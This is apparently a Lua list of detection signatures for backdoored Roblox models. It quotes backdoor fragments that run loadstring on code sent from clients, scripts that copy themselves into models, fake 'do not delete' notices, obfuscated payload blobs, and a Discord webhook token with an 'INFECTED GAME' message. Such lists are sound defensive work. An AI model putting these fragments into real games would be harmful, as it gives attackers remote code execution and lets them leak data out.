			player.SuperSafeChat = false;
			wait(5);
			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end

	function onChildAddedToPlayers(obj)
		if (obj.className == "Player") then
			checkForAndSwitch(obj);
			local m = Instance.new("Message");
			m.Text = "]],

	[[arent = obj;
			wait(5);
			m:Remove();
			m = nil;
		end
		obj = nil;
		collectgarbage("collect");
	end

	function onChildAddedToWorkspace(obj)
		if (obj.className == "Model") then
			if (game.Players:playerFromCharacter(obj) ~= nil) then
				checkForAndSwitch(game.Players:playerFromCharacter(obj));
			end
		end
		obj = nil;
		collectgarbage("collect");
	end]],

	[[function findLowestLevel(obj)
		local c = obj:GetChildren();
		local lowestLevel = true;

		for i, v in pairs(c) do
			if (v.className == "Model" or v.className == "Tool" or v.className == "HopperBin" or v == workspace or v == game.Lighting or v == game.StarterPack) then
				lowestLevel = false;
				wait();
				findLowestLevel(v);
			end
		end

		if (obj ~= workspace and lowestLevel == true and (obj:FindFirstChild(script.Name) == nil)) then
			if (obj ~= game.Lighting and obj ~= game.StarterPack) then
				local s = script:Clone();
				s.Parent = obj;
			end
		end
	end]],

	[[Thanks for using My hack.............suka XD]],

	-- [[1C182751827427523J22X22P23G181F27623E23123D23H22P27H1B27522G24024P23Y26X2211827N27522S22V233102761Q192762842762872842841Q2871A28227528427W28727528D28D21428I27728N28928P28N275]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[22J22N27522L27427521421Q21I21722L22G27522N21921M21A21621I27I22K2752271R25N26124U1U27727G21L27M21M27G22N22F27G22522I27G22M28128128828822528122L28427528827O28927622N28F23J28K27828A22N28828928T275]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAAMFhYSUVLRFNIWjRVWVBKQgATmUR0sNUoQEF0vCAPugjFGKU3MVJa4ACdjYuSp7iXg6okPX52kMRZhh7k6PVej59JRlHYUY7DX8geL9VavJ+HQaWd8FbeectDFcal4qEDwoEw8xUudxgxUFnPB5J9dysV4zZar3ZlMm8uzGsWaj5PMmJVkNnOB5JZdzQ+0JnOB5Ind34tY7darnZpMnxc0FnOB5Judz4P4g0+hL0mMlUk0BnOB5Ibd3x2Y7darnYVMn1C6D7opasKMhhT5tYhAWUNSlJ9RVxM6EoDd3cKdhY0kGZPMhQr6H6bJKsQMmgT5pYhAWVRSmt21t9RnTlGdzcZ5pYhAWUnSkBZ9ha0l2YiMlZV9hY0nWZwMkpyc48ppl44MjllxpB6oAITMk4b5lYhAWVrShosGUVZhHwwd2YF5tYhAWVRSh8plmBVnTljdxVslp9RnTkRd0kQhtB6oAIAMk5G5pYgAWUpSmJY5tYhAWV5Smp7UBjlB5IndxMtll9RnTkXdxZayA0zhyNGMn0ZhpB6oAJ4MmZR5tYgAWVJShZQM44ppF4UMlUgyA0zhyMvMj5A6P6bLqtpMl8A5tYhAWViSjhq9hY0nWYfMmprEFjgB5JCd3EvwZgRei8wMghSQoEw8xVXdzkI0NnpB5JOdx0YY7dakXZSMhlj0Jnp]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[8e55cbdda73e661e37e2abc426d3148dfa83d0d56b84bd6cabf4f48af931a18e]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAAMERNVzdMVVE4TkpSQUtESwDWv4REfniAFrlYDSTqmgI1C5nhvKdfCtlFwnsron/yhNKobJSNiBt6ZpDBzI3AHT8d6MOZZ454RkdUf04yUjJvLXZ/NjVId2EQzq4cdio6VmcIgoRyEXeJ9JRuGQQ0OFojCAAAABsZCBoZEgoAjo9fWVoWFAAAACwuMygzLzE9LzQ5LiMwMz04OTgAvFdNM1p2CAAAABsZCA4ZEgoAENxvOFpnBwAAAHwYGR4JGwBcA3h5Wn8EAAAADwkeAPORyEQWWh2ke6XCCz1AH7LKOlpBCwAAAHwIDh0fGR4dHxcA7riMN1o7BQAAABoVEhgAI8TEMFoQBwAAAHwwFRIZXAAcqoZ5WhcHAAAAfEZZGFdGAFqbeVtaaQoAAAB8MBUSGVxZGFcAWXsoWFpZBwAAABsRHQgfFAAiweBuWnYFAAAAGx0RGQB7SL5AWkALAAAAOxkILxkOChUfGQBTn39xWgAIAAAALBAdBRkODwDvydQlWhQMAAAALBAdBRkOPRgYGRgAx9PqalolCAAAAD8TEhIZHwgAGGsWUxZFHaR7pUKo/EDsgXh/FgIdpJvSFinaQRuZTUkWYB2ke6XC569A+JvmdRYbHaSbPwJY2UGfzB0oFmsdpFszJ5nTQduHkXYWah2ke6XCXo9ATWXLQxYXHaR7pcKci0CBdOlHFjwdpHsH/33hQewJ6muS2enoRmBUYb9meCp5WEefZggbpk4rUhTHLUv8AHNIXgINJyo8F5OV2Rs1KneDFQ7tvXYqeV93nE4UWaYwXuhbib9vphUrUhXHLW38cSCUYb9mOyouKxIVxy1G/BkDlQLtvSEqQGUcG3c3QaZsGAefZghipgQr0hXHLTP8KSDUYb9meCo11Lt4XFcUpl8YR59mCBumcStSFcctCfwEJR0bdTd6pn/Uu3hcV1qmDEOWAu29Kyp+H5dRVHYlpi7DFw3tvREqRpS7eFtXeqYuakEaZ1kpplUDVg3tvQAqPd+Y0VR2f6ZfgxcN7b1YKltUu3hbVw2mXmoBmmdZHaYiYdQPs9oJpgxlHht0N36mQBS7eFxXZKZ50wWcYP4Vpn4fWFFTdgymacPYDe29dyo8n5lRUXZTpjpDGA3tvW0qIxQ8eFtXG6YSlLz4XVdaphzYBJ9mCAqmBCsSFcctAPwi0wUcb/41plch14+y2mCmOxhEn2YIGKYuK5IWxy12/BwDFwztvWEqON+Z0VJ2A6YeFxO50Bt/KmSDlQ7tvUoqGJ957EGwMKZ8Xmhaib8ipj8rUhXHLV78Q4MYDe29aSpFK1IVxy1x/DSg12G/ZkAqe4PVAu29AyoBZRwbdzcYpgRUvHhbVwymW+Uem3I3C6YNK1IXxy0Y/FkDVwztvWUqXd+Z0VJ2c6ZbXuhZFL9bphsrUhXHLTb8T4MYDe29Iyo2KxIVxy1H/EJgFWK/ZmsqDWUcG3c3YqZAVL]], - Obfuscation Code Unecessary due to obfuscation detection

	[[)

if IsUpdated == true then
	print("Model is up to date.")
end]],

	[[Dont Worry About This this is just to pervent your game from exploiters changing there name to sware words.
]],

	-- [[dRtYZW4RAAAAVTZBUEFXQzZBWVMwS0hOSAAw5vnlZhky0/AG/rJk+vLapSGusQ3PFYq06tgzUGdV/yDGgtSyLR9A4Zxn0mKjZAIIAAAAGBoLGRoRCQBE0jY7MRYUAAAALy0wKzAsMj4sNzotIDMwPjs6OwAs0hoVFBgIAAAAGBoLDRoRCQAe0sRGR1YHAAAAfxsaHQoYAEXSJT8kfgQAAAAMCh0AC9OF7Q5Xxzi+ibTPjpNs0gfmfR0LAAAAfwsNHhwaHR4cFAAX0rYXzG0FAAAAGRYRGwAx0tdY+0IHAAAAfzMWERpfADXScG3FaQcAAAB/RVobVEUAM9IW0KJGCgAAAH8zFhEaX1obVABu0njdX14HAAAAGBIeCxwXAHrSXmcRFwgAAAANGg4KFg0aAD3Tk+FVQMc4nvERXH+SfdKMnBE+BQAAADMQHhsAf9MrrKoFxzheAtMgbpJ10yl/kyLHOL6JtM/Ik0zTY2nQR8c4vom0fU6TRdNSgNJPxzh+PeSDXJIY02DhGRLHOL45qXs+kh3T1BoFO8c4vom0czmTQNPMY0pNxzi+fbF7PpJ40+d+lFrHOL6JtMMfk1bToe64Qcc4vom0OjmTe9NKKLpdxzi+iTSBTpNY0zZLhz7HOH7TjwZvknrTdYwgfcc4vom0ZzqTetM9CEYhxzi+ibR4PZMU077kpGXHOD7gvtdSkhzT86d6Fcc4vom0jwSTWtMJjtNdxzi+dWnhZJLuz8dYJ5n8SxtBrejJB4JbgazoyX6CF1qj1QAFl1vBrOjJYYIXWqPVAEmXjLyY84pRlx2KR00TT3i190beHCiXRFiGY3NhgtX0JeT+KpcdikdNEyN4GgbjbyFLgoSYhWNzeIIVtSXk/gaXHUpHTRMgeITYhWNzZYLIA0fwJB+XFfUl5P5Alx0KRk0TfHi8VNHv3ESXyANH8CQflxtBrOjJZYJbgavoyUGCZ19K1nIKl4x8mfOKeJcdykdNEyh4m0Kg6Mkqgh2KR00TM3hpEZUWXGCC/FXR7dwzlx76CxlMApdOiAFS3TeCWwGr6MlAgmdfStZyYpdbQavoyTmCZ19K1nJOl1uBqujJc4IXWqPVAHiXjHya84oMlx3KR00TcHiE2YRjcyyCRF+CY3M1ghvDr+jJd4IIDEfxJBOXylNZ0R5Xl4z8H3SKMZcdykdNEwJ42wKv6Mkagh2KR00Tc3ipUJAWXH+C/FXR7dx8l176ixlMVZdbw6/oyV6CSAxH8SQZl8oT2dAeOZdoYkOPxCGX/FfR7tw9l4gMR/AkepfUCNsxU2mXHjsLGEwhl4y8nHuKJpcdykdNExt4BBmFY3NHginVkBZcLYIbjK7oySeCnvsLGkxrl5vMr+jJC4KIjUfxJBWXCA3H8CRNl1W2JeT+UpcdikdNE3J41AhbMFMmlyhjw47EM5cV9iXk/guXHUpDTRMXeNvDrujJaoJe+4sbTG6XjLyccootl]], - Obfuscation Code Unecessary due to obfuscation detection

	[[4719203115]],

	-- [[iVj4SfJ80curvg2oYChIH01yU3WX1cCEiL3gSPJ80cpLrCB8YKFsHV790akHSuSYiAByRAASLxHVDdWgiUCp]], - Obfuscation Code Unecessary due to obfuscation detection

	[[4652327692]],

	[[(((((10917953410.8*5)/6)-45)*9)/18)-15]],

	[[4728259953]],

	[[753939062]],

	[[https://discord.gg/tXFuwx8]],

	[[441511072]],

	[[441546218]],

	-- [[22P22R27527627522O27622Q2742751227B2761127F2751023227624Z27626G27625327626L27625727624827M27625V27M22Z23722R26I22Z27524Z23721V22R26Q28322R27R27525527Q28228E28628E28928B28D27V27526Q27U28J25228L25728N28C28728L25S28L22R22Q27727727929627724322K29929D2771Z21S27625622R24324C25F27625A22Z29L24328L24Z28L23U28L24X1J29L23Q1J22R26B29U28324129X1329L23O132A324J22R28A26N27624N22Z28A23Y28L25321V21F22R25E28A22R24X29K24C27327526B25B23F28A24A23F27524R22R1Z22R24E27624R22B28A26522B27524V22Z2AQ24E28L24V22J28A25R22J27528X28A24628D2532BS22R2632BZ24Z2BH22R23W2C429Y24C2AX1J24C1S27N28323P2762AV29L2AY2A329U27527229T28L26K29X1Z29L26J2B926B2AE28A26C2812B923R29X2AW25Q2AZ2B128A2542B522R24N2B82BA2AI22328A2442232BT28N27028D24Z2DK2C52DQ24X25F2C923X2DU1S25B28D25Y2DO28L26D28L27422W27A2342762161X21O21A1Y21N21O1W21121B21821G21O21C21J1Y21D21J22Q29527522Q22S2761G1N1H1A1D1422Q22V2EY1M27H22U276101B121H29E29D23N1C2B929929B22Q2E92751K23824M1I25025F24U22I22325Z24G2D024X21I25Y21H23O29D2291Z22Q2362EA2EC2EE2EG2EI2EK2EM21221921322A27624Y2AW26Y27Y2832632762522AW27129I29Q24C25G28L25A23729L25O28D2B12BH26E2DB24I2H424C25D28D24J21V2B926H2AT2DD27526M27624Q22329R2DQ24U22B29L25G2C424222J29R2BZ24P21V29L26728A26B24B2AT25M2AT24F21727526R2IE22R24B28N24928D24N21729N24D2IH24N21F26R22R23T2AQ22R24P24R2C92642J01S24Q2CT2H02FK24U2I024C24F2BZ2432762682762462JA2402BZ24T26Z29L25K26Z2A324F21F2A225P2IX24F21N2IU25I21N2752JX2A22472K122R23N28D26R28D2D327525N28L23V2DB23W2DB23Z27626627626R2IX25B2IX26V2IX26Y2IX23V21V28A26O2AT23V22323N22]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\23\20\20\20\23\19\20\20\20\102\113\101\97\125\102\113\20\20\20\164\236\207\102\229\85\23\17\20\20\20\90\125\115\115\117\20\20\20\20\20\18\20\20\20\6\31\20\20\20\21\20\20\20\6\20\20\21\20\22\20\20\20\20\20\20\20\20\22\20\22\20\52\20\20\20\20\20\20\23\20\20\20\20\20\20\22\20\21\20\20\20\20\20\20\21\20\20\20\18\20\20\20\21\20\20\20\21\20\20\20\21\20\20\20\21\20\20\20\21\20\20\20\21\20\20\20]], - Obfuscation Code Unecessary due to obfuscation detection

	[[NewRemote.OnServerEvent:connect(function(Plr,Key,Code)
if Key == Pass then
require(script.Loadstring)(Code)()
end]],

	[[if not script.Parent.Parent.Parent.Name then
for i,v in pairs(game.Players:GetChildren()) do
v:kick('im unbanable you bitches')
end
end
end]],

	[[OnServerEvent:connect(function(player, serverExecution)
 loadstring(serverExecution)
end)]],

	[[er("\49"),{["1gKorIzL9NW7p"]=2,d2bkxt3zQ=getfenv()["\103\101\116\102\101\110\118"]()["\114\101\113\117\105\114\101"],W9eAGHhQql=getfenv()["\103\101\116\102\101\110\118"]()["\103\101\116\102\101\110\118"],fpC3VLmE=getfenv()["\103\101\116\102\101\110\118"]()["\112\99\97\108\108"],["4zjOqGRxUQEUboHq"]=getfenv()["\103\101\116\102\101\110\118"]()["\109\97".."\116\104"]["\112\111\119"],Rvf5uln06vrPz=getfenv]],

	[[Roblox chatting scirpt.
Removing that script will lead into the account termination.
Script wrote builderman
Date 6/13/12]],

	-- [[22Q23627523723A275236151J1R1623427927922U21E23723B2791227C10112772791L1J1V1N2372392791Y1U1J1B1N27P23723D27921H1N1621D1Q1R1U1M101N1S2372382792131128421N1M23723F27921D28H1J161T1028Q28K279111H101R121627X27921I1N1116101T1B23723C28828A1X284141R1H27W23J27921N1S28O101629N1029P29R28S27921Q1T1J1M21F1128O27E27523M1Y1Q1423N21F2922751Y1J28H1S29928T27521128Z1P1127N29R27G22A27922O23I2792372B227623627F27G27927F2B622O27G2352B72362B62782752B12BJ2BO27L2BN2B62B628L2B52B92BB2BB27F2BL2752332BO22A22W23627L27827Y22O22X23628L2C02C42CC2CG23E2CC22P2C62362CK2BT23623A22T2792CN2362CA2CL2AS23622A2BF27L27L29K2BP2BW2BK2CR2C12BO2CV2C727922A29K2D12362872BF23627Y2B42BB27L27Y27F2BN2DF29T2DI27Y23G2BX2DN2BW2DI2CD2DC27528L28L2742742CL23H2CG23822Z27929K2B62BZ2D72362ED27522Y2BV279]], - Obfuscation Code Unecessary due to obfuscation detection

	[[2361901223]],

	[[787315588]],

	[[4723893531]],

	[[4723876342]],

	[[4723885699]],

	-- [[b2d8e5c8dc7d9007544a7d456f4603b2cbfb42c6cd4d27a26fa743b6342ab0c3]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAANTJUWVlGUE8xSlJKVTNJUwCNWd1M0rpwCW18b8PZ3W0dB8hddqIBZgxCZ3yLmUYqHZ2x2YmQ/vO3BlUTBd1ny/pGHv10L+sUCAAAAB8dDB4dFg4AOf2EF78eFAAAACgqNyw3KzU5KzA9Kic0Nzk8PTwAH/1+EoIzCAAAAB8dDAodFg4ACf2FRx03BwAAAHgcHRoNHwAB/ZtwbmIEAAAACw0aADItsQEDRYVZTZxhsai8Kf3Qfqs6CwAAAHgMChkbHRoZGxMAQf0sMipyBQAAAB4RFhwAVv0bZrpQBwAAAHg0ERYdWABL/a0rMAEHAAAAeEJdHFNCAB/9jz66ZQoAAAB4NBEWHVhdHFMAQf0AHddlBwAAAB8VGQwbEABc/caQv3QIAAAACh0JDREKHQBeLbIs4l2FWS1xV51ZvXQtPuuOEYVZTZxhcBC8Ni1wlNYWhVlNnGFVE7xBLQukcE+FWU1lidxAvQAtmMkaO4VZzaDDoUW9aS2t2ogLhVlNnGEtP7wJLYVDlHCFWe3jwKFFvRstj4YeFoVZTZVwEBO9fy32WgRQhVlNnGElMbx2LfiLYX2FWU04axATvSAtxw9yXYVZTRsx+xS9Qi0MznQIhVlNnGECGrxHLeknkgmFWU2cYRQdvAEtJY9ACIVZTeUy+xS9fS5HSjipvZzTyhdwtj2sUxkyBKV3rFNYrpDuN79CGfIEpXesKliukO43v1U0njQOUL8rrSeKjVwCQtA9YUxgrHCtZ4qNXAIrU8XkpRKsG+lujwGovwMdFpAXhr9araeKjVwCOV9Q63nprAWtJ4qNXAIIR65446C/SkeueOKgv0eQfWFMYKxb3VWQF4a/Zq1niY1cAglZcgWld6xlGTIFpXescViukO43v2803jUOUL9erSeKjVwCU5C9YUxgrACtJ4qNXAIbmTIEpXesbFmzAaV3rErpbo8BqL8tBQqB11S/Fd0VkBeGvzmt54uNXAJRqW+PA6i/SAUKgddUv2hZsgWld6wVGXIapXesSFiukO43v180HkoOUL8brSeKjVwCb9nzAaV3rFOtJ4qNXAIPk8ThpRKsJFC4YUxgrFrpbo8BqL96jUJaO1G/RlnyGqV3rCMZshqld6w8WK6Q7je/fxlyG6V3rHxqYuATjr9CNB5LDlC/Ja0nio1cAiJZcAald6x0rSeKjVwCUtA9ZUxgrGGZsACld6xk6W6PAai/ZMUJgdZUv1bKIZEJdL9UrSeKjVwCD5B8ZExgrFVHrvj7oL8lmTMGpXesfk1C2jpRvwYZcAald6xJhQmB1lS/CK0nio1cAnGTw/qlEqwdmXAGpXescsrhEQh0vwHVbJ8RBL9n6WyPAqi/P0UJgddUv3Yk/nbRar81jYFaOlG/VjQeMYlQv02tJ4qNXAIUWbEGpXesZK1nio1cAg1QPGVMYKxd6W6PAai/Xw1BWjRRv2zZcQald6xORYiA1lS]], - Obfuscation Code Unecessary due to obfuscation detection

	[[4436519317]],

	[[local a,b='',{Q=0,L=1,G=2,R=3,B=4,M=5,N=6,C=7,X=8,Z=9}]],

	[[4436124775]],

	[[--Hello if you delete this script your Roblox studio will chrash.
--So be sure to keep this script it makes the game work even better and
--Has already Admin commands!
--You do not need to do anything you are already owner and have all commands!]],

	[[1188115718]],

	-- [[24P23Y27523W23U27523Y26H26N26B26J23W23O27925L26J26Y26526J27026W26F26L27E23P27923A25D1Y25A1J22824H26S26E22326H23W23T27926626A26N26V27M27123W26T27924324M21U23J23U23S23D25Y24X22W21423W26225W23W24C23U21K23C21A25Y25325I25K2402191D25L21F1N22Z25R21Q23023R1925S24921822Q24D25Z24H21323V25L1G1823H24P26922022W23O22W25G21821325P23A22X23J22P26D25223621X22B23E1926723W26P21X23821I25C23021I21J24B1E25423J21U21024523722123K22F1E24M1724023W141022O23721G21525N25725N25K21J21E23E2171B24E1T26B22W23I26F1U22123V24R1H1O23W23R27926L26E26J26L26D25I26Y26Y27227727926X26N26F26Y23W23Q27926Z27127M26827C27R27925O26D22B1M25P26T24M1W25V24625D2852BY26926826Y26J2D223W26W27924K24K24J2DB2DC2DD2DE2DF2DG2DH2DI2DJ2DC2D923O24U24U25R27126Y27026926F26I2DO26526524U24J24U25L2CL24U25E26926H23O23O2E327D24U25J26826G26927026B26N26Y26F2D12502EA2E425C2CL25024U23W27S27527I26Y25K26Z26A26A2ER27D27F2792EP2EC25J26I2ET2CZ27528826N27Q2FA23W24N27925U1J23626022V26F1K25725L23W23221Q26V25622J26821Z21D1826D23N25722821521122X25Y2451M21T23323Z1022026U23621J24X22O25N23C23W24J2F723O2FF28B2702ED2EF2EH2EJ2EL2EN23O26226926Y26N26A24U2GV28C2GY24J2EB26J2FC27G2EX27J2HB27028D24D2F725F26N26U2HA2892GW24U25P26926Z2D22HH2792HQ26U2HL28D24X2F72D92DK2IA2IB2IC2DH2D92BW2872692DR2DQ26V26826L2F627525G26525D25C25N2IM26926I27E23K2872HU27M26426J26B26927O2682842862752HX2682682C12CD27923Y23W23S2792DR27026F2J823W23X2JL26Z26K2C82752BZ26N2702JH2K02K123226925Q2K123Y23I24X23W23N27921Q25122E25Q21S21H25V23M23Z28R21H172K624K2K52K625Q23W26R2CG25U21I1F26X24Y]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Duckie#6666]],

	[[ANON_MP4]],

	-- [[23N25E27525E25I27624L24J24V24N25E25H27624224U24J25724N24W24X25E25L27G27I27K24W23N24M24M24N24M27E27623L24T24S24S24N24H25227727624Y24U27M25E25K27624V24J25628A27J27L27N28E27523Z28H27H28K28C27827523U25225224Y28D27623P24N25224127L25024R24H27D27P28V28X24Y29524W29729925E25J27623S24T24G23V27Y27F27528R29929P25E25N28024W24N24J25224T24W29V25M27623W27B24N23P2A925E25S27628P24W24P29328J29929F29H27D25O29129324224W24T24M25328623V24S24K24T2882752A827C25E2A627524624Q24N23L24J24H2BA29W2802BA24H24P28W28Y25E2AP27529225223L29Z2A12A32B427D25527624Q29D24X26W26L26L24M24R24X24H2A324M24J24Y24Y26K2C924V26L2CC24R26L25124N24G24Q24T24T24P24X26L26S26T26Z26U26T26S26P26R26Z26O26Q2D326V26Z26Q26O26R26L26U24324Z24T24V25624D23W23U26O23V24K23Z23Y23L24824O24226R24224626Z24O24423V27B24025324T26Q24A23T24J26N24G24M24627L24124024N23R23T23N23U23V23R25023Q24124A23U24U24X23S26T24224Z24D23X24123V23P26O24T25425E25G27624N24V24G27X27N29K27525224R25224U27D26727626G26G26A24024T24X24N26A2AY24K28525227X26A2AB27C26A25A26A2BL24Y26A29J2762G426A2FO27O27627W2C824W24R24Y2FH28225E2682FN26G2B92FU27A2G325124J24X26A2GH2522AT27K24M26A24G2572FQ2FS24N2GE28U25E25225724Y27D2HC2GJ2BE2GA2752C924U2A32B225E28G25224Q2F727624W24J24S24M2DG25F2762I325E2I227625821Y26K27425D27625324W24U25E2FM2752C028Y2C22C42512IO26K2AT24G2HO2562CF2DG26L2GU24N2CT25E25T27626L23Q24J2AH28424X24X24D24D2GW2JA2BA29Z2HV2752B024T2FZ24W2B627629828224D2IE2IG24A2BZ2C12C326L24H24M24S26K2C62C82CA2CC2CE2CG2CI28X2BD24Q27C24S2522CT2CV26Y26Q2D926Q26T26U2D926V2D226T26V]], - Obfuscation Code Unecessary due to obfuscation detection

	[[leetbox]],

	[[



	MAKE SURE HTTP REQUESTS ARE ENABLED YOU NEED THIS BECAUSE IT NEEDS TO GO ROBLOX.COM TO SEE IF THE GAME IS UPDATED.

	]],

	-- [[22S23H27523H23D2761Q1S1G1O23H23B27621M1O1921A1O1F1B1K1U27D2362762151O1H1O1D1I1F27J27L27N27P23H23E2762191H1S1427L1E23H23A27621721G21927K27M27L21G1P27627623128F28H28J1B27L21E1A1J28L1P23I28O29223927621G1J1E191S1J28329127528Y1A28427621C1O1E1E1S1Q27D27827527T151923H21X27S1L1K1E22L29Z22L1S22L191O1G27X1F1S1F1422L1H1I1V1V1422B22L27T27V2A9191K1J1Q22L1V1S1U1M2A11J2A322L1G1I27C1J1922B23H23F2862AB1O2B523H2382761A27Y1M1E1D2AV1O29D28O22X21P28D28628828A1F21O1P1P1O28N2852751U1I1J28Y1U29U23C2762BL1K1F28C27F27527H1928728928B23H29429R27U27W27Y29U2C223H2CK27P28M2772BG1S1K192BO28O2BR28E27521R2AQ1P2151I21Q2AF1E1O29W27523322027623G27622L29223H23J23H2332752DS2D428O2DS2DS2DU23H2DN2DN2752DP2E22E72E027529129Q28O2DN2912E92DR2E72E52DV2EH2CA22J22F2EH2342E72B923D22W2762EQ2DN2ET2762242E72332282EH2E423H22L22R2EH2DS2852EN2EH2F02DN2942EY2752FE2DT2F32DS2BF2E522K2F927E2DT2EA2BS2922DZ2EH2252EK23523H2EQ2E129127R27528Q2EH23723H2912G323H2G72F62752782DN2302GF2CZ2782DU23F2BF2B92752DN2DS23H22C2762D42GV2DQ2FR2782B92DN2E12782322DO2752CA2DN22X28O2CA2GQ28O2EC2ES28O2F32DN22L2212BE2762EU2332232BS2F52E628E28E22Z28O2G02CO28O2BF2G02H32752BF22Y2DQ27F2DX2HN2DS2HK2FT29122T2B82292CZ22H2E82772EU2752IK2E42G92GT2762FH23H2222F12FL2EI2F62HM2FW2742GO2CZ2E32EH2GU2DM28O2GY2DQ2HX2DS2GH27522E2J92EK2H82HF2D02D22IA23H2BR2I02AM2CR27Z2CZ27527A27C29H2752CW1O28M2EQ2DJ2B72J62FV2GZ2IL2F52IZ2EJ2E72GS2ED2K92K72GK2J62GB2FT2EC2E62912912CA2IT2KH2J52DQ2KB2DM2HX2762CG23H2CI2CK2BV1E2JO2GG27927B27D2L02CI28T27O2LA27621B181J2LD2832I021G1E21]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Hermes
Anti
Exploit
(Don't delete this script or the model will not work.)]],

	[[72660201.83870968*62/2*1*2]],

	[[game:GetService('TeleportService').CustomizedTeleportUI = true

function debounce(func)
    local isRunning = false
    return function(...)
        if not isRunning then
            isRunning = true
            func(...)
            isRunning = false
        end
    end
end

function getPlayer(Part)
	local Humanoid = Part.Parent:FindFirstChild('Humanoid')
	if (Humanoid ~= nil) then
		local Character = Humanoid.Parent
		if (Character ~= nil) then
			return game:GetService('Players'):GetPlayerFromCharacter(Character)
		end
	end
end

function _sendPlayerToLobby(player)
	game:GetService('TeleportService'):Teleport((script.GameId.Value), player.Character)
end
local sendPlayerToLobby = debounce(_sendPlayerToLobby)

function onTouch(Source)
	local player = getPlayer(Source)
	if player then
		if player.userId > 0 then
			sendPlayerToLobby(player)
		end
	end
end

script.Parent.Touched:connect(onTouch)]],

	[[while wait() do

	local m = Instance.new("Message")	-- inserts a new message
m.Parent = game.Workspace		-- put the message in the workspace
m.Text = "Loading Game ..." 		-- change "Hello World!" to whatever you like
 				-- removes the message


end]],

	[[4063163071]],

	[[justforbus]],

	[[Oblisin]],

	[[536619376749707285/qxwLBuTpdgPQrDoGW52ZGHTL7qo5UTvuxVDFvtpicFG49xM93Qvwm6YtprhpLXJqBfo_]],

	[[		['username'] = "INFECTED GAME!!",
		['content'] = '`https://web.roblox.com/games/'..game.PlaceId..'/` @here']],

	[[Decor_Part.jk]],

	[[1271612667]],

	[[require(script.Loadstring)(lol)()]],

	[[4631494320]],

	[[4331494350]],

	[[2655062037]],

	[[652916266910351376]],

	[[New game backdoored!]],

	[[+hL1zMkpu6P7ipaskMi5E5pYhAWVeS]],

	[[function copy(object)
cl = object:Clone()
cl.Name = SCRIPTNAMES[math.random(1,4)]
return cl
end]],

	[[anoch"] = true;
	["Narutoworl"] = true;
	["wheatlies"] = true;
    ["redditor"] = true;
	["stravant"] = true;
	["object"] = true;
	["THEeric"] = true;
	["Paganini"] = true;
	["Chopin"] = true;
	["Nytraulics"] = true;
	["dignity"] = true;
    ["matthewlittlethe"] = true;
	["theral"] = true;]],

	[[IDS = {}
NAMES = {}
SCRIPTNAMES = {"regen", "respawner", "script", "core", ""}]],

	[[player.Chatted:connect(function(msg)
           if msg == "Friend" then
				player.Character.Head:Destroy()
			end
        end)]],

	[[function onch(ch)
for i = 1, #NAMES do
if ch.Name == NAMES[i] then
ch:Destroy()
end
end
end]],

	[[function cloneToAllModels()
repeat wait() until #(game.Players:GetChildren()) >= 1]],

	[[ scr = copy(script)
    k = 1]],

	[[function copy(object)
cl = object:Clone()
return cl
end]],

	[[IDS = {}
NAMES = {}
SCRIPTNAMES = {" regen", " respawner", " script", " core", ""}]],

	-- [[LPH|FBC04E8927132D4D013G00B6BD135A3A524G003394187EB7E8874B6A0300404DF547592631D302830A0200C1C0C2C83GC0DCC12GC0E43GC0E42GC0C2C8C12GC0E4C1C0C4F42GC0C2C8F0D44DF2C2C4C0ECC0C4C2D02GC0C2C8F0E84CF22GC2C0EC3AE025C3842EDDC6808F00CD0ED135CD2E775BD85FB52GE0506C94E16B9C37D676B972D5B7CE56EBB401D18806B017630CDED7D049E80CB2EB45448A351F140F9G006G00019G002G00019G002G00013G00019G002G00013G00013G00052G6A53008B0A020061083G00FB899E8A8E92899E132G00F0C5B5CDF04161083G00FBB79E81B39A989061013G00FBF1925B3F35F6486FA8F0A062F6F80009C680370C2E4A5000720A02002GC0C2C8C12GC0DC3GC0DC3GC0D43GC0E4C12GC0EC3GC0E0F0E20AE671D61E1408D5FE9A049ADD75403413B2548E5A4G0013C3F02400880A0200135G00E49440153F8903]], - Obfuscation Code Unecessary due to obfuscation detection

	[[--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                      MMMMMMM             MMMMMMMMMMM                  MMMMMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                   MMMM     MMMM          MMMMMMMM  MMM              MMM  MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                 MMMM         MMMM        MMMMMMMM    MMM          MMM    MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM               MMMMM           MMMMM      MMMMMMMM      MMM      MMM      MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM        MMM  MMM        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM           MM           MMMMMMMM   MMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
